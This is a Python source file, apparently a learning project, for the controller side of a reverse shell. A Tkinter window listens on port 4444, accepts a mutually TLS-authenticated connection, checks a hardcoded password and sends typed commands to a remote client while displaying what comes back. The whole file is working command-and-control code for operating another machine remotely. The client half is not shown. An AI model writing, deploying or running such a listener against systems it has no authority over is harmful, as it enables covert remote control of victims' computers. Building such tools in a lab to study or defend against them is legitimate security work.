#!/usr/bin/env python3

# What is this commantd? And why some phytons scripst start with it.

# Step 1: Creating a socket
# Step 2: Binding the socket and listening
# Step 3: Accepting connection
# Step 4: Sending command to the client
# Step 5: Client to server connection
# Step 6: Completing the client file

"""
Reverse Shell Server with a GUI Interface
-------------------------------------------
This server listens for an incoming reverse connection and provides a simple
GUI (using Tkinter) to send commands and display output.
Includes password-based authentication.
"""
import sys
import ssl
import socket
import threading
import tkinter as tk
from tkinter import scrolledtext

# Configuration
HOST = '0.0.0.0'    # Listen on all available interfaces
PORT = 4444  # Port for incoming connections

# Authentication configuration
# In a production environment, this should be securely stored (not hardcoded)
PASSWORD = "2025@UPC"  # We can change this password for a stronger one

def create_server_context(ca_file, cert_file, key_file):
    """
    - Purpose.CLIENT_AUTH enforces client certs.
    - load_cert_chain supplies our server’s cert+key.
    - load_verify_locations trusts only our CA.
    - verify_mode=CERT_REQUIRED turns on mutual-TLS.
    """
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    ctx.load_verify_locations(cafile=ca_file)                  
    ctx.verify_mode = ssl.CERT_REQUIRED

    return ctx

class ReverseShellGUI:
    def __init__(self, master):
        self.master = master
        master.title("Reverse Shell Controller")

        # A scrollable text area to display output from the client
        self.output_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.output_area.pack(padx=10, pady=10)

        # An entry widget to type commands
        self.entry = tk.Entry(master, width=80)
        self.entry.pack(padx=10, pady=(0,10))
        # Bind the "Enter" key to send commands
        self.entry.bind("<Return>", self.send_command)

        # A button to send commands
        self.send_button = tk.Button(master, text="Send", command=self.send_command)
        self.send_button.pack(pady=(0,10))

        # Create server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((HOST, PORT))
        self.server_socket.listen(1)
        self.write_output(f"[*] Listening on {HOST}:{PORT} (TLS)\n")

        # Build and store TLS context
        self.tls_ctx = create_server_context(
            ca_file   = "certs/ca.crt",
            cert_file = "certs/server.crt",
            key_file  = "certs/server.key"
        )

        threading.Thread(target=self.accept_connection, daemon=True).start()

    def accept_connection(self):
        try:
            raw_conn, self.addr = self.server_socket.accept()
            # Wrap in TLS
            try:
                self.conn = self.tls_ctx.wrap_socket(raw_conn, server_side=True)
                self.write_output(f"[*] TLS handshake with {self.addr}\n")
            except ssl.SSLError as e:
                self.write_output(f"[!] TLS handshake failed: {e}\n")
                raw_conn.close()
                threading.Thread(target=self.accept_connection, daemon=True).start()
                return

            # Authenticate
            if not self.authenticate_client():
                self.conn.close()
                threading.Thread(target=self.accept_connection, daemon=True).start()
                return

            # Launch data-receive loop
            threading.Thread(target=self.receive_data, daemon=True).start()

        except Exception as e:
            self.write_output(f"[!] Connection accept error: {e}\n")
            threading.Thread(target=self.accept_connection, daemon=True).start()

    def write_output(self, message):
        """
        Insert a message into the output area and auto-scroll to the end.
        """
        self.output_area.insert(tk.END, message)
        self.output_area.see(tk.END)

    def authenticate_client(self):
        """
        Authenticate the client using a password
        """
        try:
            # Wait to receive the password from client
            client_password = self.conn.recv(1024).decode('utf-8')
            
            # Compare with the stored password
            if client_password == PASSWORD:
                self.conn.send("AUTH_SUCCESS".encode('utf-8'))
                self.write_output("[*] Client authenticated successfully\n")
                return True
            else:
                self.conn.send("AUTH_FAILED".encode('utf-8'))
                self.write_output("[!] Client authentication failed\n")
                return False
        except Exception as e:
            self.write_output(f"[!] Authentication error: {e}\n")
            return False

    def receive_data(self):
        """
        Continuously receive data from the client and display it in the GUI.
        """
        while True:
            try:
                data = self.conn.recv(4096)
                if not data:
                    self.write_output("[*] Connection closed by the remote host.\n")
                    # Try accepting new connections after this one closes
                    threading.Thread(target=self.accept_connection, daemon=True).start()
                    break
                decoded = data.decode('utf-8', errors='ignore')
                self.write_output(decoded)
            except Exception as e:
                self.write_output(f"[!] Error receiving data: {e}\n")
                # Try accepting new connections after an error
                threading.Thread(target=self.accept_connection, daemon=True).start()
                break

    def send_command(self, event=None):
        """
        Send a command to the connected client.
        """
        if self.conn:
            cmd = self.entry.get().strip()
            if cmd:
                try:
                    self.conn.send(cmd.encode('utf-8'))
                    self.write_output(f"\n[>] {cmd}\n")
                except Exception as e:
                    self.write_output(f"[!] Failed to send command: {e}\n")
                self.entry.delete(0, tk.END)

                if cmd.lower() == "quit":
                    self.conn.close()
                    self.server_socket.close()
                    self.master.quit()
        else:
            self.write_output("[!] No client connected yet.\n")

if __name__ == '__main__':
    root = tk.Tk()
    gui = ReverseShellGUI(root)
    root.mainloop()
    
